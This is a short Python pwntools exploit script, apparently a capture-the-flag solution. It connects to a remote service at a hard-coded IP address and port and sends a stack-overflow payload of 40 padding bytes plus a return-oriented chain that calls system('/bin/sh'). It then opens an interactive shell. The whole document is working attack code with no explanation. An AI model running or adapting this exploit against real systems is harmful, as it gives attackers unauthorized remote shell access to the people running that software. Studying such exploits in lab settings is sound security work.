from pwn import *

#io = process('./pwn2')

sh = remote('117.72.52.127', 12677)

sh.recvuntil(b'Please Input your name')

pop_rdi_ret = 0x40126b
system_addr = 0x401050
binsh_addr = 0x402004

payload = b'a'*40 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)
sh.send(payload)
sh.interactive()
